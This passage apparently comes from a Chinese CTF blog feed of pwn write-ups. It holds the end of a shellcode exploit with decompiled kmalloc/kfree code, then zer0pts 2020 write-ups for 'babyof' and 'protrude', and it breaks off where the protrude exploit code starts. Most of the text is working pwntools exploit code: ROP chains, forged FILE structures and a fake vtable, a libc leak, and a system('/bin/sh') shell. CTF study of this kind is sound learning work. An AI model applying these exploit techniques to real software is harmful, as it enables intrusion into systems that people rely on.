class="line">orw_shellcode = orw_shellcode.ljust(<span class="number">0x30</span>, <span class="string">b&quot;\x90&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_flag_shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">read_flag_shellcode += asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rbp, rax</span></span><br><span class="line"><span class="string">    mov rdi, rbp</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rax, 0xa</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, rbp</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    mov rax, 0x1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    flag: .string &quot;flag&quot;</span></span><br><span class="line"><span class="string">    buf:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x173E)&quot;)</span></span><br><span class="line">edit_content(<span class="number">9</span>, p64(jmp_rsp) + orw_shellcode)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"><span class="comment"># p.send(read_flag_shellcode)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload = <span class="string">b&#x27;\xc8\x59\x01&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0xdeadbeef</span>) * <span class="number">2</span> + <span class="string">b&#x27;\x73\x0b\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="kmalloc-kfree"><a href="#kmalloc-kfree" class="headerlink" title="kmalloc,kfree"></a>kmalloc,kfree</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kmalloc</span></span><br><span class="line">__int64 __usercall kmalloc@&lt;rax&gt;(<span class="type">unsigned</span> __int64 size@&lt;rdi&gt;, <span class="type">unsigned</span> __int64 a2@&lt;rsi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 align_size; <span class="comment">// r8</span></span><br><span class="line">  __int64 bin; <span class="comment">// rsi</span></span><br><span class="line">  __int64 current_sorted_bin; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 current_size; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">bool</span> is_current_size_conmfort; <span class="comment">// zf</span></span><br><span class="line">  __int64 next_chunk; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v9; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0xFFFFFFFF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  align_size = size + <span class="number">0x10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ((size + <span class="number">0x10</span>) &amp; <span class="number">0x7F</span>) != <span class="number">0</span> )</span><br><span class="line">    align_size = (align_size &amp; <span class="number">0xFFFFFFFFFFFFFF80</span>ui64) + <span class="number">0x80</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x1000</span> )</span><br><span class="line">      panic(<span class="string">&quot;kmalloc.c#kmalloc: invalid alignment&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="number">0xFF0</span> - MEMORY[<span class="number">0x15AC0</span>]) &amp; <span class="number">0xFFF</span>) == <span class="number">0</span> || malloc_unsorted((<span class="number">0xFF0</span> - MEMORY[<span class="number">0x15AC0</span>]) &amp; <span class="number">0xFFF</span>) )<span class="comment">// 检测剩余的大小是否符合要求</span></span><br><span class="line">    &#123;</span><br><span class="line">      malloc_unsorted(align_size);</span><br><span class="line">      kfree(v9);</span><br><span class="line">      result = v10;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v10 &amp; <span class="number">0xFFF</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        panic(<span class="string">&quot;kmalloc.c#kmalloc: alignment request failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    bin = MEMORY[<span class="number">0x15AE0</span>];</span><br><span class="line">    current_sorted_bin = <span class="number">0x15AD0</span>i64;</span><br><span class="line">    <span class="keyword">while</span> ( bin )</span><br><span class="line">    &#123;</span><br><span class="line">      current_size = *bin;</span><br><span class="line">      <span class="keyword">if</span> ( (*bin - <span class="number">1</span>i64) &gt; <span class="number">0xFFFFFFFE</span> || (current_size &amp; <span class="number">0xF</span>) != <span class="number">0</span> )<span class="comment">// 对size进行检查</span></span><br><span class="line">      &#123;</span><br><span class="line">        panic(<span class="string">&quot;kmalloc.c: invalid size of sorted bin&quot;</span>);</span><br><span class="line">LABEL_12:</span><br><span class="line">        *(current_sorted_bin + <span class="number">0x10</span>) = next_chunk;<span class="comment">// 切割sorted bin，这里直接将fd指定为下一个堆块</span></span><br><span class="line">        <span class="keyword">if</span> ( !is_current_size_conmfort )</span><br><span class="line">        &#123;</span><br><span class="line">          *(bin + align_size) = current_size - align_size;</span><br><span class="line">          insert_chunk((bin + align_size));     <span class="comment">// 插入切割之后的堆块</span></span><br><span class="line">        &#125;</span><br><span class="line">        result = bin + <span class="number">0x10</span>;</span><br><span class="line">        *bin = align_size;</span><br><span class="line">        *(bin + <span class="number">8</span>) = <span class="number">0</span>i64;</span><br><span class="line">        <span class="keyword">if</span> ( bin != <span class="number">0xFFFFFFFFFFFFFFF0</span>ui64 )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      is_current_size_conmfort = align_size == current_size;<span class="comment">// 当前的sorted bin size是否合适</span></span><br><span class="line">      next_chunk = *(bin + <span class="number">0x10</span>);</span><br><span class="line">      <span class="keyword">if</span> ( align_size &lt;= current_size )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      current_sorted_bin = bin;</span><br><span class="line">      bin = *(bin + <span class="number">0x10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = malloc_unsorted(align_size);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// kfree</span></span><br><span class="line">_QWORD *__usercall kfree@&lt;rax&gt;(_QWORD *chunk@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *chunk_header; <span class="comment">// r8</span></span><br><span class="line">  _QWORD *next_chunk; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    size = *(chunk - <span class="number">2</span>);</span><br><span class="line">    chunk_header = chunk - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (size - <span class="number">1</span>) &gt; <span class="number">0xFFFFFFFE</span> || (size &amp; <span class="number">0xF</span>) != <span class="number">0</span> )<span class="comment">// size&gt;0 并且0x10对齐</span></span><br><span class="line">    &#123;</span><br><span class="line">      panic(<span class="string">&quot;kmalloc.c#kfree: invalid size&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(chunk, <span class="number">0</span>, size - <span class="number">0x10</span>);            <span class="comment">// 清空了chunk</span></span><br><span class="line">      next_chunk = (chunk_header + size);</span><br><span class="line">      <span class="keyword">if</span> ( MEMORY[<span class="number">0x15AC0</span>] == (chunk_header + size) )<span class="comment">// chunk 合并</span></span><br><span class="line">      &#123;</span><br><span class="line">        MEMORY[<span class="number">0x15AC0</span>] = chunk - <span class="number">2</span>;</span><br><span class="line">        MEMORY[<span class="number">0x15AC8</span>] += size;</span><br><span class="line">        *(chunk - <span class="number">2</span>) = <span class="number">0</span>i64;</span><br><span class="line">        <span class="keyword">return</span> next_chunk;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    next_chunk = insert_chunk(chunk_header);    <span class="comment">// 按照从小到大插入chunk</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> next_chunk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/Bozh/p/5753379.html">KVM 虚拟化原理探究— QEMU启动过程</a></p><p><a href="https://blog.keenan.top/2020/05/29/HITCON-2018-Abyss-II/">Write to kernel address zero: HITCON 2018 Abyss II</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 zer0pts CTF 部分PWN WriteUp</title>
      <link href="/posts/2046383052.html"/>
      <url>/posts/2046383052.html</url>
      
        <content type="html"><![CDATA[<h2 id="babyof"><a href="#babyof" class="headerlink" title="babyof"></a>babyof</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>很容易发现程序中存在的漏洞，栈溢出，但是程序调用的外部函数仅有<code>read,setbuf,exit</code>这三个函数。此时如果想要泄露<code>libc</code>基址的话就需要覆写<code>stdout</code>结构体中的<code>IO_write_ptr</code>指针的低位为<code>\x00</code>即可，但是当我们更改指针低字节之后还是没有办法输出，因为函数没有任何的输出函数，因此就不会刷新<code>stdout</code>。</p><p>这里我们就需要强制缓冲区刷新，即调用<code>_IO_OVERFLOW</code>，这里存在一个<code>exit</code>函数，因此我们可以直接<code>exit</code>，函数会调用<code>_IO_cleanup_all</code>，刷新每一个文件结构体，这是我们就可以泄露出<code>libc</code>的基址，但是泄露地址之后程序就退出了，因此我们还需要修改<code>vtable</code>表中的<code>__overflow</code>指针为<code>main</code>函数地址，以继续执行程序，再次利用溢出修改返回地址<code>getshell</code>。</p><p>但是如果我们修改的是<code>stdout</code>的<code>vtable</code>的<code>__overflow</code>指针的话，我们的<code>libc</code>就无法泄露，注意到<code>_IO_list_all</code>的连接顺序为<code>stderr,stdout_stdin</code>，因此我们可以修改<code>stderr</code>的<code>_IO_write_ptr</code>的低字节和<code>stdout</code>的<code>vtable</code>。在<code>exit</code>函数执行刷新文件结构体的时候就会首先泄露<code>libc</code>基址，接着就会重新返回<code>main</code>函数执行，再次利用溢出布置<code>rop chain</code>，即可<code>getshell</code>。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>首先看一下程序在<code>main</code>函数结束的时候的寄存器状态</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-zer0pts-CTF-%E9%83%A8%E5%88%86PWN-WriteUp/20200928160302.png" alt="图片无法显示，请联系作者" title=" "><p>由于调用<code>read</code>函数之后立即返回，其寄存器中的参数还没有被覆写，因此只需要修改<code>rsi</code>即可。那么我们如何在没有<code>libc</code>地址的情况下修改<code>stderr</code>的结构呢，<code>stderr</code>的地址存储在<code>.bss</code>段中</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-zer0pts-CTF-%E9%83%A8%E5%88%86PWN-WriteUp/20200928161450.png" alt="图片无法显示，请联系作者" title=" "><p>我们可以将<code>stderr-0x8</code>的地方覆写为<code>p_rsi_r</code>，<code>stderr+0x8</code>的地方写入接下来的<code>read.plt+rop chain</code>，然后将栈迁移到<code>stderr-0x10</code>的位置，此时就可以将<code>stderr</code>的真实地址写到<code>rsi</code>寄存器中，随后进行<code>read</code>即可修改<code>stderr</code>结构体中的相关数据。</p><p>在修改<code>stdout</code>结构体的时候需要覆写<code>stdout</code>指针的低字节，使得在覆写<code>vtable</code>的地址的时候绕过<code>libc</code>地址，之后再对<code>stdout</code>地址进行复原，使得在输出的时候可以正常运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x000000000040049c</span></span><br><span class="line">p_rsi_r = <span class="number">0x000000000040049e</span></span><br><span class="line">p_rbp_r = <span class="number">0x000000000040047c</span></span><br><span class="line">leave_r = <span class="number">0x0000000000400499</span></span><br><span class="line">ret = <span class="number">0x000000000040047d</span></span><br><span class="line">p_r15_r = <span class="number">0x000000000040049b</span></span><br><span class="line">stderr_address = elf.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdin_address = elf.sym[<span class="string">&#x27;stdin&#x27;</span>]</span><br><span class="line">stdout_address = elf.sym[<span class="string">&#x27;stdout&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_address = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">exit_address = elf.plt[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">main_address = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_vtable_address = elf.bss()+<span class="number">0xf00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">payload += flat([</span><br><span class="line">    p_rsi_r,</span><br><span class="line">    stderr_address - <span class="number">0x8</span>,</span><br><span class="line">    read_address,</span><br><span class="line">    p_rsi_r,</span><br><span class="line">    stderr_address + <span class="number">0x8</span>,</span><br><span class="line">    read_address,</span><br><span class="line">    p_rbp_r,</span><br><span class="line">    stderr_address - <span class="number">0x10</span>,</span><br><span class="line">    leave_r</span><br><span class="line">])</span><br><span class="line">p.send(payload)</span><br><span class="line">raw_input()</span><br><span class="line">p.send(p64(p_rsi_r))</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    read_address,</span><br><span class="line">    p_rsi_r, stdout_address - <span class="number">0x8</span>,</span><br><span class="line">    read_address,</span><br><span class="line">    p_rsi_r, stdin_address - <span class="number">0x8</span>,</span><br><span class="line">    read_address,</span><br><span class="line">    p_rsi_r, stderr_address - <span class="number">0x8</span>,</span><br><span class="line">    read_address,</span><br><span class="line">    p_rsi_r, stdout_address + <span class="number">0x8</span>,</span><br><span class="line">    read_address,</span><br><span class="line">    p_rbp_r, stdout_address - <span class="number">0x10</span>,</span><br><span class="line">    leave_r</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">fake_io = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&quot;\x88&quot;</span></span><br><span class="line">p.send(fake_io)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite stdout address to bypass libc address overwrite</span></span><br><span class="line">p.send(p64(p_rsi_r) + p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x70</span>)[:<span class="number">1</span>])</span><br><span class="line">raw_input()</span><br><span class="line">p.send(p64(p_r15_r)) <span class="comment"># pad</span></span><br><span class="line">raw_input()</span><br><span class="line">p.send(p64(p_r15_r))</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite stdout vtable address to fake vtable</span></span><br><span class="line">payload = p64(<span class="number">2</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">8</span> + p64(fake_vtable_address)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change stdout address back</span></span><br><span class="line">p.send(p64(p_rsi_r) + p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])[:<span class="number">1</span>])</span><br><span class="line">raw_input()</span><br><span class="line">p.send(p64(p_r15_r)) <span class="comment"># pad</span></span><br><span class="line">raw_input()</span><br><span class="line">p.send(p64(p_r15_r))</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    read_address, <span class="comment"># overwrite stdout</span></span><br><span class="line">    p_rsi_r, elf.bss()+<span class="number">0x808</span>,</span><br><span class="line">    read_address,</span><br><span class="line">    p_rbp_r, elf.bss()+<span class="number">0x800</span>,</span><br><span class="line">    leave_r</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">raw_input()</span><br><span class="line">p.send(fake_io)</span><br><span class="line">raw_input()</span><br><span class="line">payload = flat([</span><br><span class="line">    p_rsi_r, fake_vtable_address,</span><br><span class="line">    read_address,</span><br><span class="line">    exit_address</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">raw_input()</span><br><span class="line">fake_vtable = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(main_address)</span><br><span class="line">p.send(fake_vtable)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recv()[<span class="number">0x20</span>:<span class="number">0x28</span>]) - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">payload += flat([</span><br><span class="line">    p_rdi_r, libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__(),</span><br><span class="line">    libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="protrude"><a href="#protrude" class="headerlink" title="protrude"></a>protrude</h2><p>在内存中<code>long</code>存储的是<code>8</code>字节，但是程序中只是按照<code>4</code>字节去分配的，因此存在缓冲区溢出。但是程序存在<code>canary</code>保护，我们可以通过覆写<code>i</code>的值来绕过<code>canary</code>。每次溢出都需要覆写返回地址指向<code>calc_num</code>函数以持续获得控制流。因此选择<code>n=22</code>，输入<code>14</code>个数字之后到达<code>i</code>的存储位置。</p><p>通过覆写<code>i</code>的值绕过<code>canary</code>的栈值，直接覆写返回地址，那么第一次输出的<code>SUM</code>的值由如下构成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc_address + rbp + rbp-0xb0 + canary + 0x16*2</span><br></pre></td></tr></table></figure><p>我们可以将返回地址改写为<code>calc_num+0x9</code>的值，以重复使用之前的栈帧，同样通过覆写<code>i</code>的值绕过<code>canary</code>的值，第二次输出的<code>SUM</code>的值如下，此处的<code>buf</code>是一个任意值用来覆写<code>rbp</code>中存储的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc_address + rbp - 0x70 + canary + buf + 0x16*2</span><br></pre></td></tr></table></figure><p>通过两次输出只差可以计算出<code>rbp</code>的值。</p><p>在第三次溢出覆写的时候我们将<code>rbp</code>覆写为栈中的一个地址，改地址处存储一个<code>bss</code>的地址，用于之后的栈迁移，并在栈中布置一段<code>rop chain</code>，功能是向<code>bss</code>中读取新的<code>rop chain</code>。返回地址覆写为<code>leave_ret</code>，此时程序返回时就会跳转到栈中的地址处执行<code>rop</code>，读取新的<code>rop chain</code>进入<code>bss</code>中，并迁移栈到<code>bss</code>。</p><p>新的<code>rop chain</code>的功能是泄露<code>libc</code>基址，并读取调用<code>system(&quot;/bin/sh&quot;)</code>的<code>rop</code>。最终<code>getshell</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 